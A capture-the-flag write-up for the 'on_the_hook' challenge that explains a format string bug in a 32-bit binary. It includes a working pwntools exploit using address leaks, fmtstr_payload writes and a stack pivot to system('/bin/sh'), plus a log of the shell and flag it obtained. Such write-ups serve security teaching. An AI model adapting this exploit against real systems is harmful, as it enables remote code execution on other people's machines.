## on_the_hook

> Points: 461
>
> Solves: 22

### Description:
Captain Malloc lost his hook find it and than grab a shell for your effort.

nc ctf.k3rn3l4rmy.com 2201

### Attachments:
```
https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/on_the_hook/on_the_hook

https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/on_the_hook/libc.so.6
```

## Analysis:

This binary is clearly vulnerable to FSB (Format String Bug). The binary uses a While Loop, so we can use the FSB 5 times.
However, because it is Full Relro, GOT overwrite cannot be performed, and the main function ends with exit (0), so the return address of the main function cannot be changed.


```c
$ ./on_the_hook 
echo:
AAAA,%p,%p,%p,%p,%p,%p,%p,%p
AAAA,0x40,0xf7fa65a0,0x8049292,(nil),0xffffd223,0x1,0x41414141,0x2c70252c     <---- FSB
```

```c
$ checksec on_the_hook
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_on_the_hook/on_the_hook'
    Arch:     i386-32-little
    RELRO:    Full RELRO         <--- Full Relro
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Below is the decompiled result by Ghidra.
```c
void main(void)

{
  int in_GS_OFFSET;
  EVP_PKEY_CTX *in_stack_ffffffa0;
  int local_58;
  char local_54 [64];
  undefined4 local_14;
  undefined *puStack16;
  
  puStack16 = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  init(in_stack_ffffffa0);
  puts("echo:");
  local_58 = 1;
  while (local_58 < 6) {
    fgets(local_54,0x40,stdin);
    printf(local_54);                <------------ FSB
    local_58 = local_58 + 1;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

## Solution:

Since Got overlay is not possible, I considered the following two methods, but I used the former method. See the code in `solve_malloc_hook.py` for the latter.

--Call system('/bin/sh') by Stack pivot by rewriting the return address of printf

--Launch `/bin/sh` by writing One gadget to __malloc_hook

The Exploit code has done the following steps:

(1) Leak the Stack address using FSB to identify the return address

(2) Libc address leak using FSB to identify the address of the system function

(3) Using the ROP gadget of "add esp, 0x100; ret", write the address of the system function to the stack of the address where the return address to the main function is written + 0x104 bytes.

(4) As in (3), write the address of `/bin/sh` to the stack of the address where the return address to the main function is written + 0x10c bytes.

(5) Rewrite the return address that returns from printf to the main function to the address of "add esp, 0x100; ret".

When returning from printf to the main function in the above procedure, system ('/ bin / sh') can be started after "add esp, 0x100; ret".


The address of Stack pivot is obtained below.
```bash
$ ropper -f /lib/i386-linux-gnu/libc-2.23.so --nocolor > rop_l.txt
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

mito@ubuntu:~/CTF/K3RN3LCTF/Pwn_on_the_hook$ grep ": add esp" rop_l.txt 
...
0x00076a71: add esp, 0x100; ret;
...
```

## Exploit code:
```python
from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './on_the_hook'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.k3rn3l4rmy.com"
  PORT = 2201
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
  stack_pivot = 0x00076991 # add esp, 0x100; ret;  
else:
  s = process(BINARY)
  libc = elf.libc
  stack_pivot = 0x00076a71 # add esp, 0x100; ret; 
  #s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  #libc = ELF("./libc.so.6")
  #stack_pivot = 0x00076991 # add esp, 0x100; ret;  

index = 7

# Lead stack address
s.sendline("%21$p")
s.recvuntil("echo:\n")
stack_leak  = int(s.recvuntil('\n'), 16)
target_addr = stack_leak - 0x118
print("stack_leak  =", hex(stack_leak))
print("target_addr =", hex(target_addr))

# Leak libc address
s.sendline(p32(elf.got.setvbuf) + b"%7$s")
s.recv(4)
setvbuf     = u32(s.recv(4))
libc_base   = setvbuf - libc.sym.setvbuf
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

print("setvbuf     =", hex(setvbuf))
print("libc_base   =", hex(libc_base))

# Write system address in stack
writes = {target_addr + 0x104: system_addr}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

# Write /bin/sh address in stack
writes = {target_addr + 0x10c: binsh_addr}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

# Stack pivot(add esp, 0x100; ret;) and Start /bin/sh
writes = {target_addr: libc_base + stack_pivot}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

s.interactive()

```

## Results:
```bash
mito@ubuntu:~/CTF/K3RN3LCTF/Pwn_on_the_hook$ python3 solve_stack_pivot.py r
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_on_the_hook/on_the_hook'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2201: Done
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_on_the_hook/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline("%21$p")
solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("echo:\n")
solve.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  stack_leak  = int(s.recvuntil('\n'), 16)
stack_leak  = 0xff825894
target_addr = 0xff82577c
setvbuf     = 0xf7e24360
libc_base   = 0xf7dc4000
[*] Paused (press any to continue)
[*] Switching to interactive mode
...
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 1920
-rw-rw-r-- 1 nobody nogroup      46 Nov 11 02:58 flag.txt
-rwxrwxr-x 1 nobody nogroup  147688 Nov 11 02:58 ld-2.23.so
-rwxrwxr-x 1 nobody nogroup 1786484 Nov 11 02:58 libc.so.6
-rwxrwxr-x 1 nobody nogroup   19672 Nov 11 22:59 run
$ cat flag.txt
flag{m4l1oc_h0ok_4nd_0n3_g4d9et_3a5y_a5_7h4t}

```

## Reference:

